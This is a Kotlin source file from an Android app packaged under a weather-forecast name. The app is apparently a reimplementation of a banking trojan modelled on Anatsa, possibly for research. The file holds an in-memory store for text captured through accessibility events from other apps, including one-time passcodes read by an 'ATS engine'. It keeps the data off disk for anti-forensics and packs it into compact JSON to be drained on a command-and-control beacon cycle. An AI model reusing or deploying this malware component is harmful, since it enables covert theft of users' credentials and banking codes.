package com.skyweather.forecast.core

import java.util.concurrent.ConcurrentLinkedQueue

/**
 * Thread-safe in-memory credential buffer.
 *
 * ══════════════════════════════════════════════════════════════════
 * STAGE 2 — Credential Capture Pipeline
 * ══════════════════════════════════════════════════════════════════
 *
 * AccessibilityService callbacks run on main thread. C2 exfil runs
 * on WorkManager background thread. ConcurrentLinkedQueue bridges
 * the two without locks or synchronization overhead.
 *
 * Buffer discipline:
 *   - Max 50 entries (prevent unbounded memory growth)
 *   - Each entry: {package, viewId, text, timestamp, eventType}
 *   - drain() returns all + clears — atomic for exfil
 *   - No persistence to disk — memory only (anti-forensics)
 *
 * Real-world parallel: Anatsa V4 buffers captured credentials in
 * memory, exfils on next C2 beacon cycle, never writes to SharedPrefs
 * or SQLite. Disk forensics finds nothing.
 * ══════════════════════════════════════════════════════════════════
 */
object CredentialStore {

    private const val MAX_ENTRIES = 50

    data class CapturedEvent(
        val packageName: String,
        val viewId: String,
        val text: String,
        val timestamp: Long,
        val eventType: String
    )

    private val buffer = ConcurrentLinkedQueue<CapturedEvent>()

    /**
     * Add captured event to buffer.
     * Drops oldest if at capacity — newest data is more valuable.
     */
    fun capture(event: CapturedEvent) {
        // Safety gate: RFC1918 check — don't buffer if exfil endpoint is unsafe
        if (!AppConfig.isEndpointSafe()) return

        buffer.add(event)

        // Trim oldest entries if over capacity
        while (buffer.size > MAX_ENTRIES) {
            buffer.poll()
        }
    }

    /**
     * Drain all buffered events for exfiltration.
     * Returns list and clears buffer atomically.
     * Called by SyncTask on beacon cycle.
     */
    fun drain(): List<CapturedEvent> {
        val events = mutableListOf<CapturedEvent>()
        while (true) {
            val event = buffer.poll() ?: break
            events.add(event)
        }
        return events
    }

    /** Check if buffer has data waiting for exfil */
    fun hasPending(): Boolean = buffer.isNotEmpty()

    /** Current buffer size */
    fun size(): Int = buffer.size

    /**
     * Non-destructive read of all buffered events.
     * Used by ATS engine to find latest OTP without draining buffer.
     * SyncTask exfil still needs the full buffer → don't drain here.
     */
    fun peekAll(): List<CapturedEvent> = buffer.toList()

    /**
     * Build JSON payload from buffered events.
     * Manual construction — no Gson/Moshi dependency (Takopii Stage 13).
     */
    fun toJsonPayload(): ByteArray {
        val events = drain()
        if (events.isEmpty()) return ByteArray(0)

        val json = StringBuilder(events.size * 128)
        json.append("{\"c\":[")

        events.forEachIndexed { index, event ->
            if (index > 0) json.append(',')
            json.append('{')
            json.append("\"p\":\"").append(escapeJson(event.packageName)).append("\",")
            json.append("\"v\":\"").append(escapeJson(event.viewId)).append("\",")
            json.append("\"x\":\"").append(escapeJson(event.text)).append("\",")
            json.append("\"t\":").append(event.timestamp).append(',')
            json.append("\"e\":\"").append(event.eventType).append('"')
            json.append('}')
        }

        json.append("]}")
        return json.toString().toByteArray(Charsets.UTF_8)
    }

    private fun escapeJson(s: String): String {
        return s.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }
}
